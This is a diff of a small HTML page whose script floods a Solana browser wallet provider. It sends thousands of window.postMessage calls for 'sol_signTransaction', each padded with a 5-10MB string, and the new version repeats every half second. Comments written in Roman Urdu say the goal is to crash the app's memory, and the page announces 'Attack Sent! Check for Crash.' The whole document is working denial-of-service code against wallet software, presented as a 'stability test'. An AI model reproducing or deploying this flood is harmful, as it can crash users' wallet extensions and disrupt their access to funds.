@@ -1,20 +1,28 @@
-<script>
-    setTimeout(() => {
-        // 5MB ka aik bohot bada data block
-        const nuke = "X".repeat(5 * 1024 * 1024); 
-        const array = [];
-
-        // Loop ko 10,000 baar chalayein lekin 5MB data ke sath
-        for (let i = 0; i < 10000; i++) {
-            // Ye app ki RAM ko crash karne ki koshish karega
-            window.postMessage({
-                target: "provider",
-                data: { method: "sol_signTransaction", params: [nuke] }
-            }, "*");
+<!DOCTYPE html>
+<html>
+<body style="background-color: black; color: red; text-align: center; padding-top: 100px;">
+    <h1>CRITICAL STABILITY TEST...</h1>
+    <p>Loading Heavy Payload (50MB+ RAM Pressure)</p>
+    <script>
+        function triggerFlood() {
+            // 10MB ka aik bohot bada message
+            const heavyData = "B".repeat(10 * 1024 * 1024); 
             
-            // Background mein memory bharne ke liye
-            array.push(nuke); 
+            // Loop ko 5,000 baar chalayein
+            for (let i = 0; i < 5000; i++) {
+                window.postMessage({
+                    target: "provider",
+                    data: { method: "sol_signTransaction", params: [heavyData] }
+                }, "*");
+            }
+            // Self-triggering loop (infinite pressure)
+            setTimeout(triggerFlood, 500); 
         }
-    }, 2000);
-</script>
 
+        setTimeout(() => {
+            triggerFlood();
+            alert("Attack Sent! Check for Crash.");
+        }, 2000);
+    </script>
+</body>
+</html>
